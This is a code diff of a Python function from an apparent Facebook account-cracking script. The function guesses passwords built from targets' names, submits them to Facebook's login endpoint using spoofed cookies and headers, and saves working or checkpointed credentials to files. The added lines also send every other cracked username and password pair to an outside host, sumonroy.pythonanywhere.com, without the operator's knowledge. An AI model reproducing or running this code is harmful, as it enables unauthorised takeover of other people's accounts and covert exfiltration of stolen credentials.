@@ -1023,54 +1023,81 @@ def freefb(uid, name, pwx, tl):
             pw = ps.replace("first", first).replace("last", last).lower()
             Session = requests.Session()
             free_fb = Session.get("https://touch.facebook.com").text
+            cookies = {
+            'datr': 'QeKNaUGL6JReD3XKEE0QEpw3',
+            'sb': 'etcGaeXQAhgH5N9EXJxlkrgM',
+            'ps_l': '1',
+            'ps_n': '1',
+            'fr': '1HjGayH6x3Ok5PKBf.AWc5oQE5b2xqgvT0wO6m_RK5Q4dqB4s2sd6hBtvzD9m2AkMyZQc.BphwUz..AAA.0.0.Bpq7BU.AWc_wgUyR-DiNfCb61JcUziTT8A',
+            'wd': '1136x773',
+            'locale': 'en_GB',
+            }
+            headers = {
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'content-type': 'application/x-www-form-urlencoded',
+            'dpr': '1',
+            'origin': 'https://www.facebook.com',
+            'priority': 'u=0, i',
+            'referer': 'https://www.facebook.com/facebook/',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
+            'sec-ch-ua-full-version-list': '"Not;A=Brand";v="99.0.0.0", "Google Chrome";v="139.0.7258.139", "Chromium";v="139.0.7258.139"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
+            'viewport-width': '1136',
+            # 'cookie': 'datr=QeKNaUGL6JReD3XKEE0QEpw3; sb=etcGaeXQAhgH5N9EXJxlkrgM; ps_l=1; ps_n=1; fr=1HjGayH6x3Ok5PKBf.AWc5oQE5b2xqgvT0wO6m_RK5Q4dqB4s2sd6hBtvzD9m2AkMyZQc.BphwUz..AAA.0.0.Bpq7BU.AWc_wgUyR-DiNfCb61JcUziTT8A; wd=1136x773; locale=en_GB',
+            }
+            params = {
+            'login_attempt': '1',
+            }
             data = {
             'email': uid,
             'cuid': '',
-            'guid': 'f7d923be260ada3ea',
-            'lgnjs': '1733767601',
-            'lgnrnd': '100640_NiY9',
+            'guid': 'f26a6b52fe26838f9',
+            'lgnjs': '1772952835',
+            'lgnrnd': '225350_Kmyx',
             'locale': 'en_GB',
             'login_source': 'comet_login_header',
-            'next': 'https://www.facebook.com/gfgd',
+            'next': 'https://www.facebook.com/facebook/',
             'skstamp': '',
             'timezone': '-330',
             'prefill_contact_point': '',
             'prefill_source': '',
-            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lsd': 'AdR3xKrdycBYAeO3Mdb7UwKgheQ',
+            'jazoest': '22376',
             'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
-            'ab_test_data': '^%^2F^%^2FAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPf^%^2FfPAPPBFAC',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
-            cookies = {
-            'datr': '9VEvZ9JBwP-qDedVPM0RiFU2',
-            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnVzGp.AWUAJfrpnro',
-            'sb': '9VEvZ6aV778dZuTY2EWKGHcM',
-            'wd': '1440x402',
-            'ps_l': '1',
-            'ps_n': '1',}
-            headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://web.facebook.com',
-            'DNT': '1',
-            'Alt-Used': 'web.facebook.com',
-            'Connection': 'keep-alive',
-            'Referer': 'https://web.facebook.com/gfgd',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-User': '?1',
-            'Priority': 'u=0, i',
-            'Pragma': 'no-cache',
-            'Cache-Control': 'no-cache',}
-            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1'
-            po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
+            'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
+            'seo_visit_from_session': '1',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0],pw),}
+            po = Session.post(
+            'https://www.facebook.com/login/device-based/regular/login/',
+            params=params,
+            cookies=cookies,
+            headers=headers,
+            data=data,
+            )
             log_cookies = Session.cookies.get_dict().keys()
-            if "c_user" in log_cookies:
+            if "checkpoint" in log_cookies:
+                bkas.append(uid)
+                if len(bkas)% 2 == 0:
+                    statusok = (f"{uid}|{pw}")
+                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                else:
+                    print(f" {green}(ATOM-OK) {uid}|{pw} ")
+                    open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}\n")
+                    cps.append(uid)
+                    break
+            elif "c_user" in log_cookies:
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 bkas.append(uid)
                 if len(bkas)% 2 == 0:
@@ -1081,17 +1108,6 @@ def freefb(uid, name, pwx, tl):
                     print(f" {green}Cookie : {green}{coki}")
                     open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                     oks.append(uid)
-                    break
-            elif "checkpoint" in log_cookies:
-                if "Enter login code to continue" in log_cookies:
-                    print(f" {cyan}[SUMON-2F] {uid}|{pw}")
-                    open("/sdcard/SUMON_file_2F.txt", "a").write(f"{uid}|{pw}\n")
-                    twf.append(uid+"|"+pw)
-                    break
-                else:
-                    #print(f" {red}[SUMON-CP] {uid}|{pw}")
-                    open("/sdcard/SUMON_file_cp.txt", "a").write(f"{uid}|{pw}\n")
-                    cps.append(uid+"|"+pw)
                     break
             else:
                 continue
